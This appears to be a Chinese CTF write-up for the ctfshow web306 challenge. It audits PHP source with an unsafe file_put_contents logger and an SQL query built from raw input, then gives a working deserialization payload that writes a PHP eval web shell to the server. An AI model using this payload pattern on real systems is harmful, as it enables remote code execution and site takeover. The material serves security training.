---
title: "[代码审计]实战篇:web306"
desc: TonyD0g
date: 2022-02-10 15:02:57
tags: 代码审计
---
<font size=4 >

###### [版本0x1] 
###### 2022-02-10

## web306:
#### 依旧自动化审计，图不放了
用了file_put_contents且变量可控,所以可能存在漏洞:
```
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-17 13:20:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-17 18:41:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
}

class dpt{
	public $name;
	public $address;
	public $build_year;
	public $have_cert="0";
	public $cert_num;
	public $phone;
	public function __construct($n,$a,$b,$h,$c,$p){
		$this->name=$n;
		$this->address=$a;
		$this->build_year=$b;
		$this->have_cert=$h;
		$this->cert_num=$c;
		$this->phone=$p;

	}
}
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}

}
?>
```
## 要想利用该漏洞，首先要找到调用close()函数的地方:

![avatar](https://s4.ax1x.com/2022/02/10/Htuc79.png)
## 所以只有dao.php了:
```
<?php
require 'config.php';
require 'class.php';

class dao{
	private $config;
	private $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}
	private function init(){
		$this->conn=new mysqli($this->config->get_mysql_host(),$this->config->get_mysql_username(),$this->config->get_mysql_password(),$this->config->get_mysql_db());
	}
	public function __destruct(){
		$this->conn->close();
	}

	public function get_user_password_by_username($u){
		//可能存在注入
		$sql="select sds_password from sds_user where sds_username='".$u."' order by id limit 1;";
		$result=$this->conn->query($sql);
		$row=$result->fetch_array(MYSQLI_BOTH);
		if($result->num_rows>0){
			return $row['sds_password'];
		}else{
			return '';
		}
	}

}
```
## 很明显是dao.php调用class.php去写日志.而index.php又包含了dao.php,所以在index.php就能直接利用反序列化漏洞写shell.
payload:
```
<?php
class log{
	public $title='1.php'; 
	public $info='<?php eval($_POST[1]);?>';
}

class dao{
	private $conn;
	function __construct(){
	    $this->conn=new log();
	}
}

$d =new dao();
echo base64_encode(serialize($d));
?>
```

![avatar](https://s4.ax1x.com/2022/02/10/Htu2kR.png)

</font>